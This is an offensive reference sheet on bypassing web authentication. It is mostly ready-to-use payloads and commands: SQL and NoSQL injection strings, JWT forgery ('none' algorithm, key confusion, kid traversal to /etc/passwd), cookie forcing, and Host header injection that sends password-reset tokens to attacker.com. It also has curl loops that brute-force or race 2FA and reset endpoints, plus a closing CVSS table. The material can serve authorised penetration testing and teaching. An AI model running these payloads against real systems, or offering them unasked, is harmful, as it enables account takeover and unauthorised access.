# Authentication Bypass: Complete Reference

## Login Bypass Techniques

### SQL/NoSQL Injection
```sql
-- SQL: Classic bypass
' OR 1=1 --
admin' --
' OR '1'='1' --
admin' OR '1'='1
' UNION SELECT 1,'admin','hash' --
admin'-- -

-- NoSQL: MongoDB operator injection
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": "admin", "password": {"$exists": true}}
{"$where": "this.password.length > 0"}
```

### JWT Attacks
```python
# None algorithm
jwt.encode({"sub": "admin", "role": "admin"}, key="", algorithm="none")

# Weak HMAC secret
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Algorithm confusion (RS256 -> HS256 with public key)
public_key = open("public.pem").read()
jwt.encode({"sub": "admin"}, key=public_key, algorithm="HS256")

# kid path traversal
{"alg": "HS256", "kid": "../../../dev/null"}  # Empty key
{"alg": "HS256", "kid": "../../../../etc/passwd"}  # Key = file contents
{"alg": "HS256", "kid": "file:///proc/sys/kernel/random/uuid"}  # random key

# JWK injection
# Send a crafted jwk or jku in the JWT header
# The server uses your provided public key to verify
```

### Session Manipulation
```bash
# Session fixation
1. Get session token from server (unauthenticated)
2. Send login link with that session token to victim
3. Victim authenticates -> session now has victim's credentials

# Session prediction
# Analyze token pattern for predictability
# Common patterns: timestamp+userid, MD5(username), sequential
# Example: session=1680000000_user1 (predictable)

# Cookie manipulation
Cookie: session=admin
Cookie: role=admin
Cookie: is_admin=true
Cookie: authenticated=true
Cookie: access=full
```

### OAuth Misconfiguration
```bash
# CSRF in OAuth flow (account linking)
1. Create app on victim's OAuth provider
2. Initiate OAuth flow with victim's account
3. Intercept and replay authorization code
4. Link attacker's account to victim's OAuth provider

# Redirect URI manipulation
https://target.com/oauth/callback?code=CODE
- Change redirect_uri to attacker-controlled
- Steal authorization code via redirect

# OpenID Connect token injection
- Modify sub claim after token is issued
- Use forged ID token with modified claims
```

## Password Reset Bypass

### Token Prediction
```bash
# Predictable token patterns
- Timestamp-based: 1680000000, 1680000001
- Sequential: 1000, 1001, 1002
- Weak hash: MD5(username), SHA1(timestamp)
- Base64(email): base64("victim@email.com")
- Short tokens: 4-6 digit numeric
```

### Host Header Injection
```bash
# Reset link uses Host header to construct URL
Host: attacker.com
# Reset email sends link to https://attacker.com/reset?token=TOKEN

# X-Forwarded-Host injection
X-Forwarded-Host: attacker.com
X-Forwarded-Proto: http  # Downgrade to HTTP
```

### Rate Limit / Race Condition
```bash
# Send password reset requests in parallel
# One succeeds, bypassing token invalidation
for i in {1..100}; do
  curl -X POST /api/reset -d "email=victim@target.com" &
done

# Multiple resets for same account
# Sometimes old token remains valid
```

## 2FA/MFA Bypass

### OTP Code Attacks
```bash
# Brute force (if no rate limit)
for i in $(seq -w 000000 999999); do
  curl -X POST /api/verify-2fa -d "code=$i" &
done

# Race condition: send same code twice
curl -X POST /api/verify-2fa -d "code=123456" &
curl -X POST /api/verify-2fa -d "code=123456" &

# Response manipulation (client-side check)
{"success": false} -> {"success": true}

# OTP length variation
# Some apps accept codes of any length
code=1, code=12, code=123
```

### Backup Code Abuse
```bash
# Backup codes often have predictable patterns
# Common: 8-digit alphanumeric, often sequential
# Try: 00000000, 00000001, ABCDEF01

# Backup code reuse
# Some apps don't invalidate used backup codes
```

## Cookie Manipulation

### Cookie Force
```bash
# Manually set privileged cookies
curl -b "role=admin" https://target.com/admin
curl -b "is_admin=1" https://target.com/admin
curl -b "authenticated=true" https://target.com/admin
curl -b "access_level=full" https://target.com/admin
```

### Cookie Decoding
```bash
# Base64 decode session cookies
echo "YWRtaW46dHJ1ZQ==" | base64 -d  # admin:true

# Serialized cookies
# PHP: Tzo0OiJVc2VyIjoxOntzOjg6InJvbGVfYWRtaW4iO3M6NToiYWRtaW4iO30=
# Decoded: O:4:"User":1:{s:8:"role_admin";s:5:"admin";}

# JSON cookies
{"username":"admin","role":"admin"}
```

## Remember Me Token Manipulation
```bash
# Persistent auth cookies often stored with weak hashing
# Try: MD5(username:password), SHA1(username+secret)
# Common pattern: base64(userid:token)

# Token manipulation
# If pattern is base64(user_id:random), try other user IDs
echo "base64(1:random)" | base64 -d
echo "base64(2:random)" | base64 -d
```

## GraphQL Auth Bypass
```graphql
# Introspection may reveal authentication requirements
{ __schema { types { name fields { name type { name } } } } }

# Bypass via alias
mutation { login(username: "admin", password: "guess") }

# Batch aliases for brute force
mutation {
  a: login(username: "admin", password: "0000")
  b: login(username: "admin", password: "0001")
  c: login(username: "admin", password: "0002")
}
```

### CVSS Scoring
| Scenario | CVSS | Criteria |
|----------|------|---------|
| Authentication bypass via SQLi | 9.8 | Network, Low, No auth, All impact |
| JWT none algorithm | 9.1 | Network, Low, No auth, All impact |
| Session prediction | 8.1 | Network, High (need to predict), No auth |
| 2FA bypass via race condition | 6.5 | Network, Low, No auth, Changed scope |
| Password reset token prediction | 7.5 | Network, High, No auth, Limited impact |